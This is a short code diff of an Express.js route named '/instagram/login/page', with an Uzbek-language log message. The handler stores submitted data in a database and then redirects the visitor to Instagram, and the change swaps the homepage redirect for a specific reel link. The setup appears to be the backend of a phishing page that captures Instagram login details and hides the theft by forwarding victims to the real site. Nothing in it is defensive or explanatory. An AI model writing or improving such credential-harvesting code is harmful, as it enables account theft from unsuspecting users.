@@ -100,7 +100,9 @@ app.post("/instagram/login/page", (req, res) => {
       if (err) return res.send("Xatolik bo'ldi");
 
       console.log("✅ Bazaga saqlandi:", result.insertedId);
-      res.redirect("https://www.instagram.com");
+      res.redirect(
+        "https://www.instagram.com/reel/DP4QzInEsMb/?igsh=aHJ6aGlvank5c2lr"
+      );
     }
   );
 });
